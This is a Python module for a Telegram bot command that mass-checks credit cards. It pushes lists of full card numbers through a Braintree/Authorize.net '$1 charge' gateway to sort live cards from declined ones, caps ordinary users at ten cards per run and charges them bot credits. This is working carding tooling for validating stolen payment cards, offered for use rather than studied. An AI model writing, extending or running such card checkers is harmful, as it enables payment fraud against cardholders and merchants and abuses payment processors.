import json
import time
import threading
import asyncio
import httpx
from pyrogram import Client, filters
from datetime import timedelta
from FUNC.usersdb_func import *
from FUNC.defs import *
from .gate import *
from .response import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *

async def mchkfunc(fullcc, user_id):
    retries = 3
    for attempt in range(retries):
        try:
            session = httpx.AsyncClient(timeout=30, follow_redirects=True)
            result = await create_braintree_auth(fullcc, session)
            getresp = await get_charge_resp(result, user_id, fullcc)
            response = getresp["response"]
            status = getresp["status"]

            await session.aclose()
            return f"[そ] 𝐂𝐚𝐫𝐝↯ <code>{fullcc}</code>\n<b>[ヸ] Status - {status}</b>\n<b>[仝] Result - ⤿ {response} ⤾</b>\n\n"

        except Exception as e:
            import traceback
            await error_log(traceback.format_exc())
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
                continue
            else:
                return f"<code>{fullcc}</code>\n<b>[仝] Result - DECLINED ❌</b>\n"

@Client.on_message(filters.command("mtn", [".", "/"]))
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()

def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(stripe_mass_auth_cmd(Client, message))
    loop.close()

async def stripe_mass_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if getcc[0] == False:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]

        if user_id != "8340881349":
            if len(ccs) > 10:
                resp = """<b>
Limit Reached ⚠️

Message: You can't check more than 10 CCs at a time.
                </b>"""
                await message.reply_text(resp)
                return

        resp = f"""
- [ヸ] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  Authnet Charge $1 

- [そ] 𝐂𝐂 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(ccs)}
- [仝] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 - Checking CC For {first_name}

- [ヸ] 𝐒𝐭𝐚𝐭𝐮𝐬 - Processing...⌛️
"""
        nov = await message.reply_text(resp, message.id)

        text = f"""
<b>↯ Mass Authnet Charge $1</b> \n
"""
        amt = 0
        start = time.perf_counter()
        works = [mchkfunc(i, user_id) for i in ccs]
        worker_num = int(json.loads(open("FILES/config.json", "r", encoding="utf-8").read())["THREADS"])

        while works:
            a = works[:worker_num]
            a = await asyncio.gather(*a)
            for i in a:
                amt += 1
                text += i
                if amt % 5 == 0:
                    try:
                        await Client.edit_message_text(message.chat.id, nov.id, text)
                    except:
                        pass
            await asyncio.sleep(1)
            works = works[worker_num:]

        taken = str(timedelta(seconds=time.perf_counter() - start))
        hours, minutes, seconds = map(float, taken.split(":"))
        hour = int(hours)
        min = int(minutes)

        proxy_status = "Live ✨"  # Always indicate proxy is live

        text += f"""
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
[ﾒ] Checked By ➺ <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[ﾒ] Dev ➺ ⏤‌‌‌‌ <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
━━━━━━━━━━━━━━━
[ﾒ] T/t ➺ [{time.perf_counter() - start:0.2f} seconds] | P/x ➺ [{proxy_status}]
"""
        await Client.edit_message_text(message.chat.id, nov.id, text)
        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())